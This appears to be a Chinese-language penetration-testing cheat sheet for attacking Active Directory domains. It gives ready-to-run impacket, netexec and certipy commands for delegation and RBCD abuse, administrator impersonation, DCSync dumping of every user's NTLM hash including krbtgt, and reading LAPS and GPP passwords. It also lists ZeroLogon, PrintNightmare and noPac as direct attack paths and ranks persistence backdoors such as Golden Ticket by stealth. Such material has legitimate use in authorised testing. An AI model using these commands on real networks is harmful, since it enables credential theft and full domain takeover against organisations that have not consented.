# AD 域提权、委派攻击与持久化

## 委派攻击

### 非约束委派
委派主机可以代替任何用户向任何服务认证。诱导域管连接到委派主机 → 获取域管 TGT。
```bash
# 查找非约束委派主机
impacket-findDelegation DOMAIN/USER:PASS -dc-ip DC_IP
# 或 netexec ldap DC_IP -u USER -p PASS -M find-delegation
```

### 约束委派
服务可以代替用户向指定服务认证。如果控制了约束委派服务 → 可以模拟任意用户访问目标服务。
```bash
impacket-getST -spn TARGET_SPN -impersonate administrator DOMAIN/SERVICE_USER:PASS -dc-ip DC_IP
```

### 基于资源的约束委派 (RBCD)
如果你能修改目标的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 属性：
```bash
# 添加一个你控制的机器账户
impacket-addcomputer DOMAIN/USER:PASS -computer-name 'FAKE$' -computer-pass 'Password123!'
# 设置 RBCD
impacket-rbcd DOMAIN/USER:PASS -delegate-from 'FAKE$' -delegate-to TARGET$ -action write -dc-ip DC_IP
# 获取票据
impacket-getST -spn cifs/TARGET -impersonate administrator DOMAIN/'FAKE$':'Password123!' -dc-ip DC_IP
```

## ACL 滥用

BloodHound 中常见的危险 ACL 路径：
| 权限 | 可以做什么 |
|------|-----------|
| GenericAll | 重置密码、修改组成员、设置 RBCD |
| GenericWrite | 修改属性（设置 SPN → Kerberoasting） |
| WriteDACL | 给自己授予 GenericAll |
| WriteOwner | 修改对象所有者 → 再修改 DACL |
| ForceChangePassword | 直接重置目标密码 |
| AddMember | 将自己加入特权组 |

## 其他提权路径
- **LAPS**：`netexec ldap DC_IP -u USER -p PASS -M laps` — 读取本地管理员密码
- **GPP 密码**：`netexec smb DC_IP -u USER -p PASS -M gpp_password` — 组策略中的密码
- **ADCS 攻击**：`certipy find -u USER -p PASS -dc-ip DC_IP` — 证书服务滥用（ESC1-ESC8）

## 域控攻击

### DCSync
需要域管权限或 Replicating Directory Changes 权限：
```bash
impacket-secretsdump DOMAIN/ADMIN:PASS@DC_IP -just-dc
# 获取所有用户的 NTLM 哈希，包括 krbtgt
```

### 高危 CVE（直接攻击域控）
- **ZeroLogon (CVE-2020-1472)**：将域控机器密码重置为空，获取域管权限
- **PrintNightmare (CVE-2021-1675)**：远程代码执行
- **noPac (CVE-2021-42278/42287)**：普通域用户→域管
- **ADCS ESC8 (PetitPotam)**：强制域控认证到攻击者 → 中继获取域控证书

## 持久化

| 方法 | 条件 | 隐蔽性 |
|------|------|--------|
| Golden Ticket | krbtgt 哈希 | 高（10 年有效期） |
| Silver Ticket | 服务账户哈希 | 高（不经过域控） |
| DCSync 后门 | 域管权限 | 低（给用户加 DCSync 权限） |
| AdminSDHolder | 域管权限 | 中（60 分钟自动恢复 ACL） |
| 机器账户 | 域用户即可 | 高（RBCD 后门） |
